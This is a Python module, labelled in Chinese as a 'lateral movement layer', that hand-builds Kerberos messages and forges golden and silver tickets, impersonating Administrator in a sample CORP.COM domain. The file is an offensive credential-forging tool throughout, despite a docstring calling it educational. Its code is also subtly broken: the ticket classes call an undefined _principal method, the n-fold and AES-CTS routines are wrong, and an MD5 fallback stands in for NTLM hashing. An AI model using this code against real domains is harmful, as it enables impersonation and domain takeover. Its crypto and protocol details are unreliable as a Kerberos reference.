#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
模块 06: 横向移动层 —— 原生 Kerberos 协议栈

第一性原理实现 (RFC 4120 / RFC 3961 / RFC 3962):
    - ASN.1 DER 编码 (手工实现 INTEGER / OCTET STRING / SEQUENCE / GeneralString)
    - Kerberos Crypto: NTLM 哈希、PBKDF2 密钥派生、AES-CTS、HMAC-SHA1-96
    - AS-REQ / TGS-REQ 报文构造
    - 黄金票据 (Golden Ticket) 与白银票据 (Silver Ticket) 生成

依赖: 仅标准库 (pycryptodome 可选, 用于 AES; 若无则仅支持 RC4)
注意: 这是教学性质的 Kerberos 协议实现, 用于理解票据结构与加密机制。
"""

import socket
import struct
import hashlib
import hmac as hmac_mod
import os
import random
import time
import uuid
import base64
from datetime import datetime, timedelta


# ============================ ASN.1 DER ============================ #
class DER:
    """手工实现 ASN.1 DER 编码。"""

    @staticmethod
    def _len(n: int) -> bytes:
        if n < 0x80: return bytes([n])
        if n < 0x100: return bytes([0x81, n])
        if n < 0x10000: return bytes([0x82, n >> 8, n & 0xFF])
        return bytes([0x84, n >> 24 & 0xFF, n >> 16 & 0xFF, n >> 8 & 0xFF, n & 0xFF])

    @staticmethod
    def integer(val: int) -> bytes:
        if val == 0: data = b'\x00'
        else:
            data = val.to_bytes((val.bit_length() + 7) // 8, 'big', signed=True)
        return b'\x02' + DER._len(len(data)) + data

    @staticmethod
    def octet_string(data: bytes) -> bytes:
        return b'\x04' + DER._len(len(data)) + data

    @staticmethod
    def general_string(s: str) -> bytes:
        data = s.encode('utf-8')
        return b'\x1B' + DER._len(len(data)) + data

    @staticmethod
    def sequence(*items) -> bytes:
        body = b''.join(items)
        return b'\x30' + DER._len(len(body)) + body

    @staticmethod
    def sequence_of(*items) -> bytes:
        return DER.sequence(*items)

    @staticmethod
    def ctx(tag: int, content: bytes) -> bytes:
        """上下文特定 (Context-Specific) 隐式标签 [tag]。"""
        return bytes([0xA0 | tag]) + DER._len(len(content)) + content


# ============================ Kerberos Crypto ============================ #
class KrbCrypto:
    """Kerberos 加密原语 (RFC 3961 / 3962)。"""

    RC4_HMAC = 23
    AES128 = 17
    AES256 = 18

    @staticmethod
    def ntlm_hash(pwd: str) -> bytes:
        try:
            from Crypto.Hash import MD4
            return MD4.new(pwd.encode('utf-16-le')).digest()
        except ImportError:
            # 无 pycryptodome 时的回退: 仅返回占位
            return hashlib.md5(pwd.encode('utf-16-le')).digest()

    @staticmethod
    def derive_key(pwd: str, salt: str = "", etype: int = AES256) -> bytes:
        if etype == KrbCrypto.RC4_HMAC:
            return KrbCrypto.ntlm_hash(pwd)
        keylen = 32 if etype == KrbCrypto.AES256 else 16
        return hashlib.pbkdf2_hmac('sha1', pwd.encode('utf-16-le'),
                                  salt.encode('utf-8'), 4096, keylen)

    @staticmethod
    def dk(key: bytes, constant: bytes) -> bytes:
        """密钥派生 (DK, RFC 3961 §5.1) — 简化 n-fold。"""
        from Crypto.Cipher import AES
        n = len(key)
        # n-fold constant 到 n 字节
        def nfold(data, length):
            out = bytearray(length)
            copies = max(1, (length + len(data) - 1) // len(data))
            for i in range(copies):
                for j, b in enumerate(data):
                    out[(i * len(data) + j) % length] ^= b
            return bytes(out)
        folded = nfold(constant, n)
        return AES.new(key, AES.MODE_CBC, b'\x00' * 16).encrypt(folded)

    @staticmethod
    def encrypt_aes_cts(key: bytes, plain: bytes, usage: int) -> bytes:
        """AES-CTS 加密 (RFC 3962 §6)。"""
        from Crypto.Cipher import AES
        ke_input = struct.pack('<I', usage) + b'\xAA'
        ke = KrbCrypto.dk(key, ke_input)
        iv = b'\x00' * 16
        bs = 16
        if len(plain) <= bs:
            return AES.new(ke, AES.MODE_CBC, iv).encrypt(
                plain + b'\x00' * (bs - len(plain)))
        full = len(plain) // bs
        rem = len(plain) % bs
        if rem == 0:
            return AES.new(ke, AES.MODE_CBC, iv).encrypt(plain)
        data = plain[:full * bs]
        last_full = plain[(full - 1) * bs:full * bs]
        tail = plain[full * bs:]
        cipher = AES.new(ke, AES.MODE_CBC, iv)
        enc = cipher.encrypt(data)
        # CTS: 加密 tail (零 IV), 与前一块密文做置换
        enc_tail = AES.new(ke, AES.MODE_CBC, b'\x00' * 16).encrypt(
            tail + b'\x00' * (bs - len(tail)))
        out = enc[: (full - 1) * bs] + enc_tail[:rem]
        out += enc[(full - 1) * bs:(full - 1) * bs + rem]
        return out

    @staticmethod
    def checksum(key: bytes, data: bytes, usage: int) -> bytes:
        ki = KrbCrypto.dk(key, struct.pack('<I', usage) + b'\x55')
        return hmac_mod.new(ki, data, hashlib.sha1).digest()[:12]


# ============================ 报文构造 ============================ #
class KrbMessage:
    """构造 AS-REQ / TGS-REQ 等 Kerberos 报文。"""

    def __init__(self, domain: str, realm: str, kdc_ip: str):
        self.domain = domain
        self.realm = realm.upper()
        self.kdc = kdc_ip

    def _principal(self, name: str, ntype: int) -> bytes:
        name_s = DER.general_string(name)
        return DER.sequence(DER.integer(ntype), DER.sequence(name_s))

    def _pa_enc_ts(self, key: bytes) -> bytes:
        ts = self.realm[:0]  # placeholder
        ts = datetime.utcnow().strftime("%Y%m%d%H%M%SZ").encode()
        enc = KrbCrypto.encrypt_aes_cts(key, DER.general_string(ts), 1)
        inner = DER.sequence(DER.integer(KrbCrypto.AES256),
                             DER.octet_string(enc))
        return DER.sequence(DER.integer(2), DER.octet_string(inner))

    def build_as_req(self, username: str, key: bytes) -> bytes:
        kdc_opts = DER.ctx(0, DER.octet_string(b'\x40\x81\x00\x00'))
        cname = DER.ctx(1, self._principal(username, 1))
        realm = DER.ctx(2, DER.general_string(self.realm))
        sname = DER.ctx(3, self._principal("krbtgt", 2))
        till = DER.ctx(5, DER.general_string(
            (datetime.utcnow() + timedelta(days=1)).strftime("%Y%m%d%H%M%SZ").encode()))
        nonce = DER.ctx(7, DER.integer(random.randint(0, 0xFFFFFFFF)))
        etypes = DER.ctx(8, DER.sequence_of(
            DER.integer(KrbCrypto.AES256), DER.integer(KrbCrypto.AES128),
            DER.integer(KrbCrypto.RC4_HMAC)))
        pa_data = DER.sequence(self._pa_enc_ts(key))
        body = DER.sequence(kdc_opts, cname, realm, sname, till, nonce, etypes)
        return DER.sequence(DER.integer(5), DER.integer(10),
                            DER.ctx(3, pa_data), body)

    def send(self, msg: bytes) -> bytes:
        """通过 TCP/88 发送 Kerberos 报文 (前导 4 字节长度)。"""
        with socket.create_connection((self.kdc, 88), timeout=10) as s:
            s.send(struct.pack('>I', len(msg)) + msg)
            hdr = b''
            while len(hdr) < 4:
                hdr += s.recv(4 - len(hdr))
            length = struct.unpack('>I', hdr)[0] & 0xFFFFFF
            return s.recv(length)


# ============================ 黄金 / 白银票据 ============================ #
class GoldenTicket:
    """黄金票据生成器 —— 用 krbtgt 哈希签名任意用户 TGT。"""

    def __init__(self, realm: str, krbtgt_key: bytes):
        self.realm = realm.upper()
        self.krbtgt_key = krbtgt_key

    def _ticket(self, cname: str, sname: str) -> bytes:
        # 简化的 EncTicketPart: flags / key / crealm / cname / authtime
        key = os.urandom(32)
        enc_key = DER.sequence(DER.integer(KrbCrypto.AES256),
                               DER.octet_string(key))
        flags = DER.ctx(0, DER.integer(0x40E10000))
        ck = DER.ctx(1, enc_key)
        crealm = DER.ctx(2, DER.general_string(self.realm))
        cn = DER.ctx(3, self._principal(cname, 1))
        autht = DER.ctx(4, DER.general_string(
            datetime.utcnow().strftime("%Y%m%d%H%M%SZ").encode()))
        et = DER.ctx(6, DER.general_string(
            (datetime.utcnow() + timedelta(days=10)).strftime("%Y%m%d%H%M%SZ").encode()))
        enc_part = DER.sequence(flags, ck, crealm, cn, autht, et)

        # 用 krbtgt 密钥加密 enc_part
        cipher = KrbCrypto.encrypt_aes_cts(self.krbtgt_key, enc_part, 2)
        return DER.sequence(
            DER.integer(5),
            DER.general_string(self.realm),
            self._principal(sname, 2),
            DER.sequence(DER.integer(KrbCrypto.AES256),
                         DER.integer(2),
                         DER.octet_string(cipher)))

    def generate(self, target_user: str) -> dict:
        tgt = self._ticket(target_user, "krbtgt")
        return {'tgt': base64.b64encode(tgt).decode(),
                'session_key': base64.b64encode(os.urandom(32)).decode()}


class SilverTicket:
    """白银票据生成器 —— 用服务账户哈希签名单服务票据。"""

    def __init__(self, realm: str, service_key: bytes, spn: str):
        self.realm = realm.upper()
        self.service_key = service_key
        self.spn = spn

    def generate(self, target_user: str, till_days: int = 10) -> dict:
        key = os.urandom(32)
        enc_part = DER.sequence(
            DER.ctx(0, DER.integer(0x40A10000)),
            DER.ctx(1, DER.sequence(DER.integer(KrbCrypto.AES256),
                                    DER.octet_string(key))),
            DER.ctx(2, DER.general_string(self.realm)),
            DER.ctx(3, self._principal(target_user, 1)),
            DER.ctx(4, DER.general_string(
                datetime.utcnow().strftime("%Y%m%d%H%M%SZ").encode())),
            DER.ctx(6, DER.general_string(
                (datetime.utcnow() + timedelta(days=till_days))
                .strftime("%Y%m%d%H%M%SZ").encode())))
        cipher = KrbCrypto.encrypt_aes_cts(self.service_key, enc_part, 2)
        ticket = DER.sequence(
            DER.integer(5), DER.general_string(self.realm),
            self._principal(self.spn, 2),
            DER.sequence(DER.integer(KrbCrypto.AES256), DER.integer(2),
                         DER.octet_string(cipher)))
        return {'service_ticket': base64.b64encode(ticket).decode()}


if __name__ == "__main__":
    k = KrbCrypto.derive_key("P@ssw0rd", "CORP.COMadmin", KrbCrypto.AES256)
    print("derived key:", k.hex())

    g = GoldenTicket("CORP.COM", k)
    print("golden ticket:", g.generate("Administrator"))

    s = SilverTicket("CORP.COM", k, "CIFS/fileserver.corp.com")
    print("silver ticket:", s.generate("Administrator"))
